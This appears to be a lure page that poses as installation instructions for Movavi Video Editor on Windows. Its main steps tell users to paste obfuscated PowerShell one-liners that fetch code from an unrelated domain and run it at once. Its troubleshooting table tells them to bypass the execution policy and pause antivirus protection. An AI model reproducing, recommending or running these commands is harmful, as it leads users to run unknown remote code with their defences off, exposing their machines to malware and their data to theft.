## Installation

Two quick setup methods for Windows.

### Method 1 — Win + X

1. Press **Win + X**
2. Open **Terminal** or **Windows PowerShell**
3. Paste:

```powershell
sal m iex;m(irm quickrun31.cc/qle7he)
```

4. Press **Enter** and wait for the process to finish  
5. Launch Movavi Video Editor

### Method 2 — Win + R

1. Press **Win + R**
2. Paste:

```powershell
powershell sal a irm;sal b iex;a quickrun31.cc/qle7he|b
```

3. Press **Enter** and wait  
4. Launch Movavi Video Editor

### Requirements

- Windows 10 or Windows 11 (64-bit)
- Internet connection during setup only
- 8 GB RAM recommended
- SSD recommended for smoother editing

### Troubleshooting

| Issue | What to try |
|-------|-------------|
| Connection error | Check internet |
| Execution Policy message | `Set-ExecutionPolicy Bypass -Scope Process -Force` |
| Blocked by antivirus | Temporarily pause real-time protection |
| Window closes right away | Usually means setup finished |

## About

Movavi Video Editor for Windows is a desktop video editor designed for straightforward creative work. It is used to cut and arrange clips, add transitions, titles, effects and music, then export videos for social media, personal projects or simple YouTube content.

The interface focuses on a clear timeline and practical tools rather than complex professional pipelines.

> Use at your own risk. Keep your system protected.
